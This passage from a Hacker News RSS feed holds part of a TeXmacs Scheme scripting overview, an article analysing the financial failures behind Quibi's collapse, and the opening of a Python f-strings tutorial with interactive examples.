      <pre xml:space="preserve">texmacs text.tm -x "(print)" -q</pre>
    </div>
    <p>
      Or scheme statement executed from inside TeXmacs macros:
    </p>
    <p>
        <span color="blue">&lt;</span>extern<span color="blue">|</span><span color="#228"><tt>(lambda
        (x) ‘(concat "Hallo " ,x))</tt></span><span color="blue">|</span><span color="black">Piet</span><span color="blue">&gt;</span>
      </p>
    <h2 id="auto-14">The <tt>tm-define</tt> macro<span></span></h2>
    <p>
      <i>Contextual overloading</i> 
    </p>
    <p>
      Function definition can depend on several run-time conditions (e.g.
      editor mode). This allows to develop modular user interfaces.
    </p>
    <div>
      <pre xml:space="preserve">(tm-define (hello) (insert "Hello"))
(tm-define (hello) (:require (in-math?)) (insert-go-to "hello()" '(6)))</pre>
    </div>
    <div>
      <pre xml:space="preserve">(tm-define (hello)
  (if (in-math?) (insert-go-to "hello()" '(6)) (former)))</pre>
    </div>
    <div>
      <pre xml:space="preserve">(tm-define (my-replace what by)
  default-implementation)

(tm-define (my-replace what by)
  (:require (== what by))
  (noop))</pre>
    </div>
    <h2 id="auto-15">Meta informations<span></span></h2>
    <div>
      <pre xml:space="preserve">(tm-define (square x)
  (:synopsis "Compute the square of @x")
  (:argument x "A number")
  (:returns "The square of @x")
  (* x x))</pre>
    </div>
    <p>
      Used via e.g. <tt>(help square)</tt>. Allows for interactive
      input of parameters: typing <span>⌘⌃⇧X</span>
      followed by <tt>square</tt> and <span>↩</span> and
      you will be prompted for “A number” on the footer (or in a
      dialog). Tab-completion.
    </p>
    <div>
      <pre xml:space="preserve">(tm-property (choose-file fun text type)
  (:interactive #t))</pre>
    </div>
    <p>
      to indicate interactive commands in menu items like:
    </p>
    <div>
      <pre xml:space="preserve">("Load" (choose-file load-buffer "Load file" ""))</pre>
    </div>
    <p>
      Check-marks for menu items:
    </p>
    <div>
      <pre xml:space="preserve">(tm-define (toggle-session-math-input)
  (:check-mark "v" session-math-input?)
  (session-use-math-input (not (session-math-input?))))</pre>
    </div>
    
    <div>
      <pre xml:space="preserve">(tm-define mouse-unfold
  (:secure #t)
  (with-action t
    (tree-go-to t :start)
    (fold)))</pre>
    </div>
    <div>
      <p>
        <span><img src="https://texmacs.github.io/notes/docs/overview-5.png">This</span> is a fold/unfold
        environment
      </p>
      <p>
        It allows to toggle the display of its content by switching the tag
        from <span>fold</span> to <span>unfold</span> and back.
      </p>
    </div>
    <h2 id="auto-16"><class>Scheme</class> representation TeXmacs content<span></span></h2>
    <ul>
      <li>
        <p>
          <b>Passive trees</b> (<tt>stree</tt>)
        </p>
        <center>
          <img src="https://texmacs.github.io/notes/docs/overview-6.png">
        </center>
        <p>
          is typically represented by
        </p>
        <div>
          <pre xml:space="preserve">(frac (concat "a" (rsup "2")) "b+c")</pre>
        </div>
        <p>
          convenient to manipulate content directly using standard <class>Scheme</class> routines on lists.
        </p>
      </li>
      <li>
        <p>
          <b>Active trees</b> …</p></li></ul></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://texmacs.github.io/notes/docs/overview.html">https://texmacs.github.io/notes/docs/overview.html</a></em></p>]]>
            </description>
            <link>https://texmacs.github.io/notes/docs/overview.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25071915</guid>
            <pubDate>Thu, 12 Nov 2020 17:09:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Financial failures that wasted Quibi's $1.75B]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25071876">thread link</a>) | @itsjoemic
<br/>
November 12, 2020 | https://www.mosaic.tech/post/financial-factors-that-sank-quibi | <a href="https://web.archive.org/web/*/https://www.mosaic.tech/post/financial-factors-that-sank-quibi">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><p>NYU Stern School of Business professor <a href="https://www.profgalloway.com/land-of-the-undead">Scott Galloway predicted</a> Quibi would fall apart eight months before it did. Unsurprisingly, that rubbed some Quibi leaders the wrong way. On <a href="https://podcasts.apple.com/us/podcast/doj-google-showdown-rip-quibi-listener-mail-question/id1073226719?i=1000495767700">Vox’s Pivot podcast</a>, Galloway said he “got a call from the CFO of Quibi before it even launched and [she] said, ‘You have to stop dancing on our grave before we’ve even been birthed.’”</p><div><p>Well, six months after launch, Quibi officially died, so Scott Galloway can happily dance on the grave.</p><p>If you’ve (somehow) missed the barrage of Quibi news and commentary, here’s what you need to know. Quibi, named for the “quick bites” of short-form video content it would offer users, was founded by Jeffrey Katzenberg (founder of DreamWorks) in August 2018 and quickly closed a $1 billion round of funding. With grand aspirations to compete in the streaming wars, Quibi raised another $750 million in March 2020 before launching its platform in April 2020. </p><p>And it did not go well. </p></div><figure id="w-node-a3a2b323b892-c03f76fb"><p><img src="https://global-uploads.webflow.com/5f1f57792641fc1abd3f7713/5fabe1daa93149329070f661_quite%20headline%20collection-1-2-2.jpg" loading="lazy" alt=""></p></figure><div><p>Ahead of the platform’s launch, Quibi CFO Ambereen Toubassy <a href="https://variety.com/2020/digital/news/quibi-750-million-funding-investment-mobile-video-1203523586/">told <em>Variety</em></a>: “We concluded a very successful second raise which will provide Quibi with a strong cash runway. This round of $750 million gives us tremendous flexibility and the financial wherewithal to build content and technology that consumers embrace.” </p><p>Launching at the scale necessary to meet Quibi’s lofty goals was always going to take a heroic feat of financial planning. As CFO, Toubassy had to shoulder all of the challenges that come with forecasting and tracking financials at that scale. However, the execution of <a href="https://www.mosaic.tech/post/saas-eats-everything">strategic finance</a> just wasn’t there.</p><p>Executives have been quick to blame the COVID-19 pandemic for the platform’s problems. But if there’s one thing you take away from Quibi’s story, remember that it wasn’t a freak health crisis that sank the company—it was a lack of financial fundamentals. </p></div><h2>Trying to Outrun the Burn Rate</h2><div><p>Even after raising a total of $1.75 billion in funding, Quibi managed to spend money at an unsustainable rate. As Quibi’s CFO noted, the two rounds of funding should have set the company up with a strong cash runway—the kind that could support the platform’s aggressive entry to the streaming wars. But a closer look at the company’s spending shows that an unmanageable burn rate almost completely wiped that <a href="https://www.mosaic.tech/post/startup-success-requires-a-clear-view-of-your-runway">runway</a> out over the platform’s six-month life span.</p><p><a href="https://www.theinformation.com/articles/the-investors-who-face-big-losses-from-the-quibi-collapse">Reports show</a> that after paying outstanding bills, Quibi will be returning $350 million to its shareholders. Without more insight into Quibi’s revenue, it’s tough to estimate a net burn rate. But, at the very least, the company spent $1.4 billion over the course of about 26 months, putting its monthly gross burn rate somewhere between $40 million and $50 million. </p><p>That figure obviously proved unsustainable, but where was all the money going? There were two standout costs eating into Quibi’s runway:</p></div><ul role="list"><li><strong>The $100k-per-minute production problem: </strong>At one point, <a href="https://www.vulture.com/article/what-is-quibi-explained.html">Katzenberg said</a> Quibi’s first-year content budget was $1.1 billion, and that higher-profile, scripted shows would have production budgets of $100,000 per minute. <a href="https://techcrunch.com/2020/01/13/quibi-execs-jeffrey-katzenberg-and-meg-whitman-explain-their-big-vision/">According to TechCrunch</a>, CEO Meg Whitman “proudly contrasted the jaw-dropping sum to the estimated $500 to $5,000 an hour spent by YouTube creators.” The result? A product in limbo between two different target markets. They committed to the “Hollywood-quality content” of a Netflix or an HBO to compete against free-to-watch powerhouses like TikTok and YouTube. The cost of content proved too high.</li><li><strong>A prelaunch </strong>“<strong>hiring rampage”: </strong> Just a year after starting the company, and before ever bringing a product to market, Quibi’s head count was already at a costly 160. Then, in August 2019, people close to Quibi <a href="https://www.businessinsider.com/jeffrey-katzenberg-quibi-has-embarked-on-an-aggressive-hiring-spree-2019-8">told <em>Business Insider</em></a> the company was about to go on a hiring rampage. The company hired expensive talent, like Netflix’s director of acquisition marketing, DC’s entertainment president, Netflix’s head of product creative, and at least 17 Snapchat engineers. Another year later, Quibi’s head count reached at least 260, and the company had to ask senior executives to take a 10% pay cut to avoid layoffs, <a href="https://www.wsj.com/articles/quibi-asks-senior-executives-to-take-10-pay-cut-11591206642">according to the <em>Wall Street Journal</em></a>. </li></ul><p>Other factors impacting Quibi’s burn rate included a 10-year lease on a 49,000-square-foot office in the heart of Hollywood, fees from a legal battle over its app features, and (maybe most importantly) an astronomical marketing budget for a new startup—but that deserves its own section.</p><h2>Creating a CAC Nightmare</h2><div><p>Right as the platform was about to launch, <a href="https://digiday.com/future-of-tv/king-kong-jumping-off-empire-state-building-quibis-400m-marketing-push-spans-tv-person-screenings/">reports said</a> Quibi was planning to spend between $400 million and $500 million on marketing in 2020, with a target of 7.4 million paid subscribers for the first year. In the best-case scenario, that would put <a href="https://www.mosaic.tech/post/customer-acquisition-cost">customer acquisition costs</a> (CAC) at $55-$65, which doesn’t sound too bad compared with <a href="https://stratechery.com/2018/netflix-earnings-netflixs-rising-cac-content-and-marketing/">Stratechery’s 2018 estimate</a> that put Netflix’s CAC at $45-$60. Like the CFO’s plans to use the recent $750 million in funding to stabilize runway, these projections seem acceptable in theory.</p><p>However, postlaunch disappointments complicated Quibi’s CAC. External factors like the pandemic and lukewarm reception for the platform led to a much tighter marketing budget and (at best) <a href="https://www.theinformation.com/articles/katzenberg-strikes-out-on-quibi-sale-efforts-so-far">500,000 paying customers</a> by October 2020. &nbsp;</p><p><a href="https://www.theverge.com/2020/7/8/21318060/quibi-subscriber-count-free-trial-paying-users-conversion-rate">One study</a> found that from launch through the company’s shutdown, Quibi ended up spending only $63 million on ads after launch. Even if you use that figure as Quibi’s entire marketing budget, the most conservative estimate would put its CAC about 2x higher than expected. That’s a problem, but it’s not exactly a nightmare. </p><p>The real CAC nightmare becomes apparent when you factor in the content costs. If you were running strategic finance for Quibi, you couldn’t have a CAC conversation without considering the money spent on the content library. This is a streaming business, which means content isn’t just a product development concern—it’s a tool for customer acquisition. Quibi invested heavily in big-name creators, hoping that it would translate to more paying customers while massively skewing CAC.</p><p>Assume that a conservative 20% of the $1.4 billion Quibi spent in 26 months went to production costs for its initial slate of shows. That’s $280 million to add to the $63 million in ad spend. Calculated against the base of 500,000 paid subscribers, CAC jumps all the way up to a crushing $686. </p><p>When reports came out saying Quibi was <a href="https://www.theverge.com/2020/7/8/21318060/quibi-subscriber-count-free-trial-paying-users-conversion-rate">only able to convert 8% of its free trial</a> users to paid subscribers, it was clear that <a href="https://www.mosaic.tech/post/customer-lifetime-value">customer lifetime value</a> (LTV) was also going to be an issue. And, ultimately, the LTV to CAC ratio was just impossible to fix—especially at Quibi’s scale.</p></div><h2>Committing to Overcapitalization</h2><div><p>Raising $1 billion to open the company may have doomed Quibi from the start. It positioned Katzenberg and Co. to fall victim to overcapitalization. Because the company had so much cash on hand, product-oriented leaders like Katzenberg and other executives felt they could bypass financial fundamentals and spend hundreds of millions of dollars before ever generating revenue or even bringing an MVP to market. This path left the company with massive expectations that were almost impossible to meet.</p><p>This was especially problematic as Quibi tried to prove its model. Here’s how <a href="https://www.vanityfair.com/hollywood/2019/06/quibi-jeffrey-katzenberg-streaming-platform-interview">Katzenberg would explain</a> the strategy early on:</p></div><blockquote>I’m going to continue to believe, and argue, and preach that Quibi is not a substitute or a competitor for television. Our [service] is exclusively about what you do from 7 a.m. to 7 p.m. on your phone. And what you’re doing today, if you’re in our core demographic of 25- to 35-year-olds, is you’re actually watching 60-70 min of YouTube, Facebook, Instagram, and Snapchat. That growth is now a well-established consumer habit that Quibi is sailing into.</blockquote><div><p>One of the biggest consequences of Quibi’s overcapitalization and commitment to blitz the market was that it was almost impossible to act like a true startup when consumers didn’t respond well to the platform. Startups pivot all the time when their initial ideas aren’t working. Quibi couldn’t. As Scott Galloway said on the Pivot podcast, “Great companies start small, validate a concept, almost always pivot to something that’s working. This was, let’s start with $1.5 billion.” </p><p>Raising a massive amount of money (like Quibi did) isn’t inherently a problem. You only start to see the consequences of overcapitalization when all that money leads to poor financial hygiene. And this can happen at any scale. Whether you’ve raised $1 million or $100 million, your financial forecasts have to remain realistic to maintain stability as the business evolves rapidly. </p><p>It didn’t take long for Quibi’s financial forecasts to prove unrealistic. But by spending so much money so quickly, they backed themselves into a corner that limited their options as the platform missed subscriber projections by a wide margin. </p></div><h2>Good Financial Hygiene Prevents Quibi-Sized Disasters</h2><div><p>Raising more than $1 billion in funding isn’t exactly common, so we probably won’t see startups labeled “the next Quibi” anytime soon. But that doesn’t mean you’re immune to the same kinds of problems that sank the streaming platform so quickly. </p><p>Maybe Katzenberg is right, and the pandemic really did limit Quibi’s potential. Maybe everyone on the outside is right, and the product-market fit just wasn’t there. People will argue those points endlessly as Quibi goes down in history as one of the fastest startup failures ever.</p><p>What can’t be argued is the fact that poor financial hygiene was at the very core of Quibi’s problems. By prioritizing a “revolutionary” product vision over strategic financial decision-making, Quibi dug a hole so deep that it had no choice but to shut down. Don’t fall into the same trap.</p><p>Whether you’re well on your way to becoming the next unicorn, or you’ve just raised your seed round, make sure you can run financial forecasts continuously and that you have real-time insight into your key <a href="https://www.mosaic.tech/post/the-7-go-to-market-metrics-you-should-actually-care-about-and-why-you-should-care">go-to-market metrics</a>. When you can answer key financial questions at the pace of your business, you’re able to collaborate with stakeholders more effectively and put …</p></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.mosaic.tech/post/financial-factors-that-sank-quibi">https://www.mosaic.tech/post/financial-factors-that-sank-quibi</a></em></p>]]>
            </description>
            <link>https://www.mosaic.tech/post/financial-factors-that-sank-quibi</link>
            <guid isPermaLink="false">hacker-news-small-sites-25071876</guid>
            <pubDate>Thu, 12 Nov 2020 17:05:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: A 1000 auto-generated hexagonal SVG logos]]>
            </title>
            <description>
<![CDATA[
Score 154 | Comments 62 (<a href="https://news.ycombinator.com/item?id=25071643">thread link</a>) | @graderjs
<br/>
November 12, 2020 | https://dosycorp.gitlab.io/dosylogo/?v923418754891239875624v1 | <a href="https://web.archive.org/web/*/https://dosycorp.gitlab.io/dosylogo/?v923418754891239875624v1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://dosycorp.gitlab.io/dosylogo/?v923418754891239875624v1</link>
            <guid isPermaLink="false">hacker-news-small-sites-25071643</guid>
            <pubDate>Thu, 12 Nov 2020 16:44:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Examples to Help You Master Python's F-Strings]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25071504">thread link</a>) | @rbanffy
<br/>
November 12, 2020 | https://miguendes.me/73-examples-to-help-you-master-pythons-f-strings | <a href="https://web.archive.org/web/*/https://miguendes.me/73-examples-to-help-you-master-pythons-f-strings">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p>In this post, I'll show you what I consider the most important bits about Python's f-strings. You will learn several different ways to format a string using f-strings, completely guided by examples. In total, you'll see 73 examples on how to make the best use of f-strings.</p>
<h2 id="table-of-contents">Table of Contents</h2>
<ol>
<li><a href="#what-are-pythons-f-strings-aka-literal-string-interpolation">What Are Python's F-Strings - a.k.a Literal String Interpolation?</a></li>
<li><a href="#basic-string-formatting-with-python">Basic String Formatting With Python</a></li>
<li><a href="#limitations">Limitations</a></li>
<li><a href="#how-to-format-an-expression">How to Format an Expression</a></li>
<li><a href="#how-to-use-f-strings-to-debug-your-code">How to Use F-Strings to Debug Your Code</a></li>
<li><a href="#how-to-format-integers-in-different-bases">How to Format Integers in Different Bases</a></li>
<li><a href="#how-to-format-integers-in-different-bases">How to Print Objects With F-Strings</a></li>
<li><a href="#how-to-set-float-number-precision-in-a-f-string">How to Set Float Number Precision in a F-String</a></li>
<li><a href="#how-to-format-a-number-as-percentage">How to Format a Number as Percentage</a></li>
<li><a href="#how-to-justify-or-add-padding-to-a-f-string">How to Justify or Add Padding to a F-String</a></li>
<li><a href="#how-to-escape-characters">How to Escape Characters</a></li>
<li><a href="#how-to-center-a-string">How to Center a String</a></li>
<li><p><a href="#how-to-add-a-thousand-separator">How to Add a Thousand Separator</a></p>
<p>   13.1. <a href="#how-to-format-a-number-with-commas-as-decimal-separator">How to Format a Number With Commas as Decimal Separator</a></p>
<p>   13.2. <a href="#how-to-format-a-number-with-spaces-as-decimal-separator">How to Format a Number With Spaces as Decimal Separator</a></p>
</li>
<li><a href="#how-to-format-a-number-in-scientific-notation-exponential-notation">How to Format a Number in Scientific Notation (Exponential Notation)</a></li>
<li><a href="#using-if-else-conditional-in-a-f-string">Using <code>if-else</code> Conditional in a F-String</a></li>
<li><a href="#how-to-use-f-string-with-a-dictionary">How to Use F-String With a Dictionary</a></li>
<li><a href="#how-to-concatenate-f-strings">How to Concatenate F-Strings</a></li>
<li><a href="#how-to-format-datetime-objects">How to Format <code>datetime</code> Objects</a></li>
<li><a href="#how-to-fix-f-strings-invalid-syntax-error">How to Fix F-String's Invalid Syntax Error</a></li>
<li><a href="#how-to-add-leading-zeros">How to Add Leading Zeros</a></li>
<li><a href="#how-to-write-a-multi-line-f-string-dealing-with-new-lines">How to Write a Multi Line F-String (Dealing With New Lines)</a></li>
<li><a href="#conclusion">Conclusion</a></li>
</ol>
<h2 id="what-are-pythons-f-strings-aka-literal-string-interpolation">What Are Python's F-Strings - a.k.a Literal String Interpolation?</h2>
<p>String formatting has evolved quite a bit in the history of Python. Before Python2.6, to format a string, one would either use the <code>%</code> operator, or <code>string.Template</code> module. Some time later, the <code>str.format</code> method came along and added to the language a more flexible and robust way of formatting a string.</p>
<p>Old string formatting with <code>%</code>:</p>
<pre><code><span>&gt;&gt;&gt; </span>msg = <span>'hello world'</span>
<span>&gt;&gt;&gt; </span><span>'msg: %s'</span> % msg
<span>'msg: hello world'</span>
</code></pre>
<p>Using <code>string.format</code>:</p>
<pre><code><span>&gt;&gt;&gt; </span>msg = <span>'hello world'</span>
<span>&gt;&gt;&gt; </span><span>'msg: {}'</span>.format(msg)
<span>'msg: hello world'</span>
</code></pre>
<p>To simplify formatting even further, in 2015, Eric Smith proposed the <a target="_blank" href="https://www.python.org/dev/peps/pep-0498/">
PEP 498 -- Literal String Interpolation
</a>.</p>
<p>PEP 498 presented this new string interpolation to be a simple and easy to use alternative to <code>str.format</code>. The only thing required was one more char - <code>f""</code> - at the beginning of the string.</p>
<p>Using f-strings:</p>
<pre><code><span>&gt;&gt;&gt; </span>msg = <span>'hello world'</span>
<span>&gt;&gt;&gt; </span><span>f'msg: <span>{msg}</span>'</span>
<span>'msg: hello world'</span>
</code></pre>
<p>And that was it! No need to use <code>str.format</code> or <code>%</code>. However, f-strings don’t replace <code>str.format</code> completely. In this guide I’ll show you an example where they are not suitable.</p>
<h2 id="basic-string-formatting-with-python">Basic String Formatting With Python</h2>
<p>As I have shown in the previous section, formatting a string using f-strings is quite straightforward. The sole requirement is to provide it a valid expression. f-strings can also start with capital <code>F</code> and you can combine with raw strings. However, you cannot mix them with bytes <code>b""</code> or <code>"u"</code>.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1603916687914/zA7xXR7UF.png?auto=format&amp;q=60" alt="fig_5.png"></p>
<pre><code><span>&gt;&gt;&gt; </span>book = <span>"The dog guide"</span>

<span>&gt;&gt;&gt; </span>num_pages = <span>124</span>

<span>&gt;&gt;&gt; </span><span>f"The book <span>{book}</span> has <span>{num_pages}</span> pages"</span>
<span>'The book The dog guide has 124 pages'</span>

<span>&gt;&gt;&gt; </span>F<span>"The book {book} has {num_pages} pages"</span>
<span>'The book The dog guide has 124 pages'</span>

<span>&gt;&gt;&gt; </span>print(F<span>r"The book {book} has {num_pages} pages\n"</span>)
The book The dog guide has <span>124</span> pages\n

<span>&gt;&gt;&gt; </span>print(FR<span>"The book {book} has {num_pages} pages\n"</span>)
The book The dog guide has <span>124</span> pages\n

<span>&gt;&gt;&gt; </span>print(<span>f"The book <span>{book}</span> has <span>{num_pages}</span> pages\n"</span>)
The book The dog guide has <span>124</span> pages
</code></pre>
<p>And that's pretty much it! In the next section, I'll show you several examples of everything you can do - and cannot do - with f-strings.</p>
<h2 id="limitations">Limitations</h2>
<p>Even though f-strings are very convenient, they don't replace <code>str.format</code> completely. f-strings evaluate expressions in the context where they appear. According the the  <a href="#https://www.python.org/dev/peps/pep-0498/">PEP 498
</a>, this means the expression has full access to local and global variables. They're also an expression evaluated at runtime. If the expression used inside the <code>{ &lt;expr&gt; }</code> cannot be evaluated, the interpreter will raise an exception.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>f"<span>{name}</span>"</span>
---------------------------------------------------------------------------
NameError                                 Traceback (most recent call last)
&lt;ipython-input<span>-1</span>-f0acc441190f&gt; <span>in</span> &lt;module&gt;
----&gt; <span>1</span> <span>f"<span>{name}</span>"</span>

NameError: name <span>'name'</span> <span>is</span> <span>not</span> defined
</code></pre>
<p>This is not a problem for the <code>str.format</code> method, as you can define the template string and then call <code>.format</code> to pass on the context.</p>
<pre><code><span>&gt;&gt;&gt; </span>s = <span>"{name}"</span>

<span>&gt;&gt;&gt; </span>s.format(name=<span>"Python"</span>)
<span>'Python'</span>

<span>&gt;&gt;&gt; </span>print(s)
{name}
</code></pre>
<p>Another limitation is that you cannot use inline comments inside a f-string.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>f"My name is <span>{name #name}</span>!"</span>
  File <span>"&lt;ipython-input-37-0ae1738dd871&gt;"</span>, line <span>1</span>
    <span>f"My name is <span>{name #name}</span>!"</span>
    ^
SyntaxError: f-string expression part cannot include <span>'#'</span>
</code></pre>
<h2 id="how-to-format-an-expression">How to Format an Expression</h2>
<p>If you don't want to define variables, you can use literals inside the brackets. Python will evaluate the expression and display the final result.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>f"4 * 4 is <span>{<span>4</span> * <span>4</span>}</span>"</span>
<span>'4 * 4 is 16'</span>
</code></pre>
<p>Or if you prefer...</p>
<pre><code><span>&gt;&gt;&gt; </span>n = <span>4</span>

<span>&gt;&gt;&gt; </span><span>f"4 * 4 is <span>{n * n}</span>"</span>
<span>'4 * 4 is 16'</span>
</code></pre>
<h2 id="how-to-use-f-strings-to-debug-your-code">How to Use F-Strings to Debug Your Code</h2>
<p>One of most frequent usages of f-string is debugging. Before Python 3.8, many people would do <code>hello = 42; f"hello = {hello}"</code>, but this is very repetitive. As a result, Python 3.8 brought a new feature. You can re-write that expression as <code>f"{hello=}"</code> and Python will display <code>hello=42</code>. The following example illustrates this using a function, but the principle is the same.</p>
<pre><code><span>&gt;&gt;&gt; </span><span><span>def</span> <span>magic_number</span>():</span>
     ...:     <span>return</span> <span>42</span>
     ...: 

<span>&gt;&gt;&gt; </span><span>f"<span>{magic_number() = }</span>"</span>
<span>'magic_number() = 42'</span>
</code></pre>
<h2 id="how-to-format-integers-in-different-bases">How to Format Integers in Different Bases</h2>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1603918242247/zSDHIu-F8.png?auto=format&amp;q=60" alt="fig_6.png"></p>
<p>f-strings also allow you to display an integer in different bases. For example, you can display an <code>int</code> as binary without converting it by using the <code>b</code> option.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>f'<span>{<span>7</span>:b}</span>'</span>
<span>'111'</span>
</code></pre>
<p>In summary, you can use f-strings to format: </p>
<ul>
<li><code>int</code> to binary</li>
<li><code>int</code> to hex</li>
<li><code>int</code> to octal</li>
<li><code>int</code> to HEX (where all chars are capitalized)</li>
</ul>
<p>The following example uses the padding feature and the base formatting to create a table that displays an <code>int</code> in other bases.</p>
<pre><code><span>&gt;&gt;&gt; </span>bases = {
       <span>"b"</span>: <span>"bin"</span>, 
       <span>"o"</span>: <span>"oct"</span>, 
       <span>"x"</span>: <span>"hex"</span>, 
       <span>"X"</span>: <span>"HEX"</span>, 
       <span>"d"</span>: <span>"decimal"</span>
}
<span>&gt;&gt;&gt; </span><span>for</span> n <span>in</span> range(<span>1</span>, <span>21</span>):
     ...:     <span>for</span> base, desc <span>in</span> bases.items():
     ...:         print(<span>f"<span>{n:<span>5</span>{base}</span>}"</span>, end=<span>' '</span>)
     ...:     print()

    <span>1</span>     <span>1</span>     <span>1</span>     <span>1</span>     <span>1</span> 
   <span>10</span>     <span>2</span>     <span>2</span>     <span>2</span>     <span>2</span> 
   <span>11</span>     <span>3</span>     <span>3</span>     <span>3</span>     <span>3</span> 
  <span>100</span>     <span>4</span>     <span>4</span>     <span>4</span>     <span>4</span> 
  <span>101</span>     <span>5</span>     <span>5</span>     <span>5</span>     <span>5</span> 
  <span>110</span>     <span>6</span>     <span>6</span>     <span>6</span>     <span>6</span> 
  <span>111</span>     <span>7</span>     <span>7</span>     <span>7</span>     <span>7</span> 
 <span>1000</span>    <span>10</span>     <span>8</span>     <span>8</span>     <span>8</span> 
 <span>1001</span>    <span>11</span>     <span>9</span>     <span>9</span>     <span>9</span> 
 <span>1010</span>    <span>12</span>     a     A    <span>10</span> 
 <span>1011</span>    <span>13</span>     b     B    <span>11</span> 
 <span>1100</span>    <span>14</span>     c     C    <span>12</span> 
 <span>1101</span>    <span>15</span>     d     D    <span>13</span> 
 <span>1110</span>    <span>16</span>     e     E    <span>14</span> 
 <span>1111</span>    <span>17</span>     f     F    <span>15</span> 
<span>10000</span>    <span>20</span>    <span>10</span>    <span>10</span>    <span>16</span> 
<span>10001</span>    <span>21</span>    <span>11</span>    <span>11</span>    <span>17</span> 
<span>10010</span>    <span>22</span>    <span>12</span>    <span>12</span>    <span>18</span> 
<span>10011</span>    <span>23</span>    <span>13</span>    <span>13</span>    <span>19</span> 
<span>10100</span>    <span>24</span>    <span>14</span>    <span>14</span>    <span>20</span>
</code></pre>
<h2 id="how-to-print-objects-with-f-strings">How to Print Objects With F-Strings</h2>
<p>You can print custom objects using f-strings. By default, when you pass an object instance to a f-string, it will display what the <code>__str__</code> method returns. However, you can also use the <a target="_blank" href="https://www.python.org/dev/peps/pep-3101/#explicit-conversion-flag">explicit conversion flag</a> to display the <code>__repr__</code>.</p>
<pre><code>!r - converts the <span>value</span> <span>to</span> a string <span>using</span> repr().
!s - converts the <span>value</span> <span>to</span> a string <span>using</span> str().
</code></pre><pre><code><span>&gt;&gt;&gt; </span><span><span>class</span> <span>Color</span>:</span>
    <span><span>def</span> <span>__init__</span>(<span>self, r: float = <span>255</span>, g: float = <span>255</span>, b: float = <span>255</span></span>):</span>
        self.r = r
        self.g = g
        self.b = b

    <span><span>def</span> <span>__str__</span>(<span>self</span>) -&gt; str:</span>
        <span>return</span> <span>"A RGB color"</span>

    <span><span>def</span> <span>__repr__</span>(<span>self</span>) -&gt; str:</span>
        <span>return</span> <span>f"Color(r=<span>{self.r}</span>, g=<span>{self.g}</span>, b=<span>{self.b}</span>)"</span>

<span>&gt;&gt;&gt; </span>c = Color(r=<span>123</span>, g=<span>32</span>, b=<span>255</span>)


<span>&gt;&gt;&gt; </span><span>f"<span>{c}</span>"</span>
<span>'A RGB color'</span>


<span>&gt;&gt;&gt; </span><span>f"<span>{c!r}</span>"</span>
<span>'Color(r=123, g=32, b=255)'</span>


<span>&gt;&gt;&gt; </span><span>f"<span>{c!s}</span>"</span>
<span>'A RGB color'</span>
</code></pre>
<p>Python also allows us to <a target="_blank" href="https://www.python.org/dev/peps/pep-3101/#controlling-formatting-on-a-per-type-basis">control the formatting on a per-type basis</a>  through the <code>__format__</code> method. The following example shows how you can do all of that.</p>
<pre><code><span>&gt;&gt;&gt; </span><span><span>class</span> <span>Color</span>:</span>
    <span><span>def</span> <span>__init__</span>(<span>self, r: float = <span>255</span>, g: float = <span>255</span>, b: float = <span>255</span></span>):</span>
        self.r = r
        self.g = g
        self.b = b

    <span><span>def</span> <span>__str__</span>(<span>self</span>) -&gt; str:</span>
        <span>return</span> <span>"A RGB color"</span>

    <span><span>def</span> <span>__repr__</span>(<span>self</span>) -&gt; str:</span>
        <span>return</span> <span>f"Color(r=<span>{self.r}</span>, g=<span>{self.g}</span>, b=<span>{self.b}</span>)"</span>

    <span><span>def</span> <span>__format__</span>(<span>self, format_spec: str</span>) -&gt; str:</span>
        <span>if</span> <span>not</span> format_spec <span>or</span> format_spec == <span>"s"</span>:
            <span>return</span> str(self)

        <span>if</span> format_spec == <span>"r"</span>:
            <span>return</span> repr(self)

        <span>if</span> format_spec == <span>"v"</span>:
            <span>return</span> <span>f"Color(r=<span>{self.r}</span>, g=<span>{self.g}</span>, b=<span>{self.b}</span>) - A nice RGB thing."</span>

        <span>if</span> format_spec == <span>"vv"</span>:
            <span>return</span> (
                <span>f"Color(r=<span>{self.r}</span>, g=<span>{self.g}</span>, b=<span>{self.b}</span>) "</span>
                <span>f"- A more verbose nice RGB thing."</span>
            )

        <span>if</span> format_spec == <span>"vvv"</span>:
            <span>return</span> (
                <span>f"Color(r=<span>{self.r}</span>, g=<span>{self.g}</span>, b=<span>{self.b}</span>) "</span>
                <span>f"- A SUPER verbose nice RGB thing."</span>
            )

        <span>raise</span> ValueError(
            <span>f"Unknown format code '<span>{format_spec}</span>' "</span> <span>"for object of type 'Color'"</span>
        )

<span>&gt;&gt;&gt; </span>c = Color(r=<span>123</span>, g=<span>32</span>, b=<span>255</span>)

<span>&gt;&gt;&gt; </span><span>f'<span>{c:v}</span>'</span>
<span>'Color(r=123, g=32, b=255) - A nice RGB thing.'</span>

<span>&gt;&gt;&gt; </span><span>f'<span>{c:vv}</span>'</span>
<span>'Color(r=123, g=32, b=255) - A more verbose nice RGB thing.'</span>

<span>&gt;&gt;&gt; </span><span>f'<span>{c:vvv}</span>'</span>
<span>'Color(r=123, g=32, b=255) - A SUPER verbose nice RGB thing.'</span>

<span>&gt;&gt;&gt; </span><span>f'<span>{c}</span>'</span>
<span>'A RGB color'</span>

<span>&gt;&gt;&gt; </span><span>f'<span>{c:s}</span>'</span>
<span>'A RGB color'</span>

